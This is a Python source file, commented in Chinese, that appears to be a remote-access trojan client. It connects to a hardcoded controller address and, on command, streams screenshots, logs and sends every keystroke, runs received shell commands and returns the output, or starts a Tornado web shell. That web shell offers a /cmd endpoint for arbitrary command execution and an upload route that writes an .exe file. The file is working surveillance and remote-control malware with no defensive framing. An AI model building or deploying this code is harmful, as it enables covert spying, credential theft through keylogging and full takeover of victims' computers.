# console端
# 建立连接，获取数据包，按大小轮询获取，直到完成，结束时保存图片
import socket
import sys
import threading
import pyautogui
import time
import os
import struct
from pynput.keyboard import Listener
from tornado.web import RequestHandler, Application
from tornado.httpserver import HTTPServer
from tornado.ioloop import IOLoop
from tornado.options import options, define, parse_command_line
# from tornado.websocket import websocket
import base64



# 操作屏幕类

class socket_connect_sreecnShot:
    def socket_console(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # 连接到主机
            s.connect(("192.168.2.105", 14445))
            return s

        except socket.error as e:
            print(e)
            sys.exit(1)

    def scrennShot(self):
        name = 'temp.jpg'
        print('截屏')
        time.sleep(2)
        img = pyautogui.screenshot()
        img.save(name)
        print("截屏结束")
        return name

    def sendDataPack(self, s):
        # 发送数据包
        filepath = 'temp.jpg'
        # 判断文件是否存在
        if os.path.isfile(filepath):
            # 表示存在
            # 封装一个包，含文件名，大小b
            # 128s:128bytes长度，l表示int/long类型
            filepath_size = struct.calcsize("128sl")
            # basename()取文件名称，不带格式的
            filehead = struct.pack('128sl', bytes(os.path.basename(
                filepath).encode('utf-8')), os.stat(filepath).st_size)
            print('===================')
            print(filehead)
            # 将头部信息发送给控制终端
            s.send(filehead)
            return filepath

    def openSreenImg(self, s, filepath):
        # 打开文件，并以进制的方式打开
        f = open(filepath, 'rb')
        while 1:
            data = f.read(1024)
            if not data:
                print("读取完毕")
                break
            s.send(data)
        f.close()
        os.remove('temp.jpg')

# 记录键盘类
# class RecordKeybrond(object):

#     def press(key):
#         print(key.char)

def press(key):
    global serachKey
    sok = socket_connect_sreecnShot()
    s = sok.socket_console()
    try:
        serachKey = key.char
        sendKey()
        s.send(serachKey.encode())
        print(serachKey)

    except AttributeError as a:
        serachKey = key
        sendKey()
        s.send(serachKey.encode())
        print(serachKey)
    s.close()
def sendKey():
    global serachKey
    serachKey = str(serachKey)
    
def send(s):
    s.send(serachKey.encode())

def recvOrder():
    screenShot1 = socket_connect_sreecnShot()
    con=screenShot1.socket_console()
    while 1:
        data = con.recv(1024)
        if data:
            # print(data.decode())
            con.close()
            return data.decode()
            # break
        else:
            continue  

def cmdControl():
    
    while True:
        screenShot1 = socket_connect_sreecnShot()
        con=screenShot1.socket_console()
        data = con.recv(1024)
        res =os.popen(data.decode(),"r",1)
        res = res.read()
        con.send(res.encode('utf-8'))
        con.close()

#路由控制
class screenShotHandler(RequestHandler):
    def get(self):
        html="<img src={}>"
        s = socket_connect_sreecnShot()
        name =s.scrennShot()
        if os.path.isfile(name):
            with open(name,'rb') as f:
                base64_data = base64.b64encode(f.read())
                self.write("""<img src='data:image/jpeg;base64,{}'>
                <script type="text/javascript">window.onload = ()=>setInterval(()=>location.reload(), 3000)</script>
                """.format(base64_data.decode()))
        else:
            print('no')
            return 'no'
        os.remove(name)           
#路由控制

class cmdHandler(RequestHandler):
    def get(self):
        #pass
        #接受URL的参数
        #argument
        # print('hah')
        cmd = self.get_query_argument("cmd",None) #前一个参数为参数的别名，后一个参数为默认值
        chDir = self.get_query_argument('dir',None)
        if chDir:
            print(chDir)
            flag = os.chdir(chDir)
            # if flag:
            #     res = os.popen('dir','r')
            #     res = res.read()
            #     self.write(res)
            # else:
            #     self.write('切换失败')    
                
        if cmd:
            res = os.popen(cmd,'r')
            res = res.read()
            self.write(res)    
            
       

# 路由控制

class indexHandler(RequestHandler):
    def get(self):
        html = '''
<form action="http://127.0.0.1/uploadFile" method="post" enctype="multipart/form-data">
    <p><input type="file" name="upload"></p>
    <p><input type="submit" value="submit"></p>
</form>
        '''

        self.write(html)
# 路由控制

class uploadFile(RequestHandler):
    def post(self):
        upload = self.request.files
        # with open("x.exe", "wb") as e:
        #     e.write(upload)
        # print(upload["upload"][0]["filename"])
        print(type(upload["upload"][0]["body"]))
        with open("abc.exe","wb") as t:
            t.write(upload["upload"][0]["body"])


def app():
    return Application([("/", indexHandler), ("/upload", uploadFile),("/cmd", cmdHandler),("/screenshot",screenShotHandler)])

def webShellMain():
    sok = socket_connect_sreecnShot()
    s = sok.socket_console()
    port = s.recv(1024).decode()
    print(port)
    define("port", default=port, help="this is port")
    parse_command_line()
    server = HTTPServer(app())
    server.bind(options.port)
    server.start()
    IOLoop.current().start()


if __name__ == "__main__":
    order = recvOrder()
    if str(order) == str(1):
        screenShot = socket_connect_sreecnShot()
        # 获取连接后socket对象
        print(screenShot.socket_console())
        s=screenShot.socket_console()
        # 截屏操作
        while 1:
            screenShot.scrennShot()
            filepath = screenShot.sendDataPack(s)
            screenShot.openSreenImg(s, filepath)
        s.close()
    elif str(order) ==str(2):
        # sok = socket_connect_sreecnShot()
        # s = sok.socket_console()
        with Listener(on_press = press) as listener:
                listener.join()
    elif str(order) == str(3):
        cmdControl()
    elif str(order) == str(4):
        webShellMain()      
    else:
        pass 

          

    


